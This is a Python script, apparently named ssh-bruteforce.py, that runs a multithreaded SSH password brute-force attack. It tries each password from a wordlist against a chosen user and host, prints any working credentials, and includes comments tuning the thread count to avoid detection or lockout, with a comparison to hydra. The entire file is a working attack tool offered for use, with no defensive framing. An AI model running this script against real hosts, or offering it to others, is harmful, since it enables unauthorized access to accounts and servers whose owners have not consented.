import paramiko
import sys
from concurrent.futures import ThreadPoolExecutor
import time

""""
pip3 install paramiko
"""

def ssh_attempt(user, host, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password)
        print(f"[+] Successful login to {host}  \nuser: {user}  \npassword: {password}")
        exit(0)
    except EOFError:
        print("[-] Connection reset by peer, waiting before retrying...")
        time.sleep(1)  # wait for 1 second
        # optionally, you can retry the connection here
        # not yet working properly 

    except paramiko.AuthenticationException:
        print(f"[-] Authentication failed {user} : {password}")
        # print(f"\r[-] Authentication failed {user} : {password}", end="\r")

    except paramiko.SSHException as e:
        print(f"SSH error occurred: {str(e)}")
    

    finally:
        client.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python ssh-bruteforce.py <user> <host>")
        return

    user = sys.argv[1]
    host = sys.argv[2]
    # password_list = "rockyou.txt"
    password_list = "passwords.txt"

    # Read the passwords into a list
    with open(password_list, "r", encoding='latin-1') as f:
        passwords = f.read().splitlines()

    # Set the number of threads
    # threads = 20 # too fast
    # threads = 10 # risky
    threads = 7 # safe but fast 
    # hydra only recommends 4 
    

    try:
        # Create a thread pool and map the ssh_attempt function to each password
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda password: ssh_attempt(user, host, password), passwords)
    except KeyboardInterrupt:
        print("Interrupted by user, shutting down...")
        exit(0)
        
if __name__ == "__main__":
    main()
